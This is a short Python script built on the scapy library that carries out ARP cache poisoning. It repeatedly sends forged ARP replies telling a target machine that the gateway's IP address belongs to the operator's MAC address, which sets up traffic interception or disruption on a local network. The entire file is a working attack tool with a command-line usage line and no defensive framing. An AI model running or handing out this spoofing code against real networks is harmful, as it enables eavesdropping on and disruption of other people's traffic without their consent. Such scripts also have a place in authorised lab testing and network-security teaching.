from scapy.all import *
from optparse import OptionParser
import sys
import time

usage = 'Usage: [interface] [localhost_mac] [gateway] [target_ip]'
try:
    interface = sys.argv[1]
    ip_mac_local = sys.argv[2]
    ip_gateway = sys.argv[3]
    ip = sys.argv[4]
except:
    print(usage)
    sys.exit(0)

ip_mac = getmacbyip(ip)

print("[*] target_mac: %s" % ip_mac)
print("[*] localhost_mac: %s" % ip_mac_local)

packet = Ether(src=ip_mac_local, dst=ip_mac)/ARP(psrc=ip_gateway, hwsrc=ip_mac_local,pdst=ip, hwdst=ip_mac, op=2)

print("[*] ARP attacking... ")
try:
    while True:
        sendp(packet, inter=2, iface=interface)
        time.sleep(2)

except KeyboardInterrupt:
    print "[*] Stop..."
    sys.exit(0)

